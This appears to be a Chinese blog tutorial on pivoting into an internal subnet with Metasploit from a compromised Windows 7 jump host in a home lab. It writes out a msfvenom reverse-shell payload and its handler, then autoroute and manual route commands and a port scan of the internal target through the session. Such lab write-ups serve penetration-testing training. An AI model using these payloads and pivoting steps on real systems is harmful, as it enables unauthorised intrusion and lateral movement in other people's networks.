---
layout: post
title: Metasploit  「跨网段攻击」添加路由表
comments: false
description: ""
keywords: "Tricks"
---

开一个系列，记录一下 Metasploit 框架的一些技巧；

## 情况？

Mac【Metasploit】：192.168.43.100

Win7【跳板机】：192.168.215.144【Nat】、172.16.63.128【仅主机】

Linux【目标机】：172.16.63.129【仅主机】，开启80端口方便检测验证

需要解释下这里跳板机为啥采用Nat方式获取ip，而不是桥接？因为主机Mac上网是连的CMCC-EDU，在校也很无奈额...

![QQ20180109-213706@2x.png](/assets/images/2018-01-06/537458916.png)

实际场景：当获得一台跳板机的权限后，如何针对其内网进行渗透；

这种场景可利用手段很多，各种转发代理进内网工具数不胜数...

这里利用 `Metasploit 添加路由表` 来跨网段攻击；

## 脚本 autoroute

前提拿到跳板机的 Meterpreter shell；

```
[Go0s]: ~ 
➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe -o ~/Desktop/shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
Saved as: /Users/go0s/Desktop/shell.exe
```

这里直接在跳板机运行上线；

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.43.100
lhost => 192.168.43.100
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] Sending stage (179267 bytes) to 192.168.43.100
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.100:59135) at 2018-01-06 19:48:56 +0800
```

先查看跳板机处于哪几个网段中，使用 `get_local_subnets` 脚本；

```
meterpreter > run get_local_subnets 

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 172.16.63.0/255.255.255.0
Local subnet: 192.168.215.0/255.255.255.0
```

结果如期；

直接将内网网段172.16.63.0/24添加至路由表，使用 `autoroute` 脚本；

```
meterpreter > run autoroute -s 172.16.63.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.63.0/255.255.255.0...
[+] Added route to 172.16.63.0/255.255.255.0 via 192.168.43.100
[*] Use the -p option to list all active routes
```

将session退出至后台，使用 `route print` 查看路由表映射情况；

可以看出网关Gateway是Meterpreter shell的session，即跳板机；

```
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(handler) > route print 

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.63.0        255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
```

使用端口扫描模块验证目标机80端口；

```
msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > show options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf auxiliary(tcp) > set rhosts 172.16.63.129
rhosts => 172.16.63.129
msf auxiliary(tcp) > set ports 80
ports => 80
msf auxiliary(tcp) > exploit 

[+] 172.16.63.129:        - 172.16.63.129:80 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

路由成功，使用MSF成功检测【攻击】内网目标机；

但是它有弊端，如果子网太大可能会将本机的数据包广播出去，所以最好看一下子网大小，使用手动添加路由；

## 手工设置路由表

即代替上种方法中的 `autoroute` 脚本；

```
查看跳板机所处网段：
meterpreter > run get_local_subnets 
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 172.16.63.0/255.255.255.0
Local subnet: 192.168.215.0/255.255.255.0

将运行着的session退至后台：
meterpreter > background
[*] Backgrounding session 1...

添加路由：
msf exploit(handler) > route add 172.16.63.0 255.255.255.0 1
[*] Route added
msf exploit(handler) > route print
IPv4 Active Routing Table
=========================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.63.0        255.255.255.0      Session 1
[*] There are currently no IPv6 routes defined.
```

## 诟病

本机Metasploit使用【手工设置路由表】设置路由后，竟然同步到了本机上，造成本机直接可以访问目标机...

原因很简单，MSF界面使用命令作用于本机...这里首推使用脚本来添加；

删除本条路由，需要root权限；

```
[Go0s]: ~ 
➜  netstat -nr
Routing tables
Internet:
Destination        Gateway            Flags        Refs      Use   Netif Expire
172.16.63/24       link#18            UC              2        0  vmnet1
172.16.63.128      0:c:29:c:e1:c5     UHLWI           0       21  vmnet1    707
172.16.63.129      0:c:29:f1:8c:aa    UHLWIi          1     1528  vmnet1   1184

[Go0s]: ~ 
➜  sudo route delete 172.16.63/24    
delete net 172.16.63
```
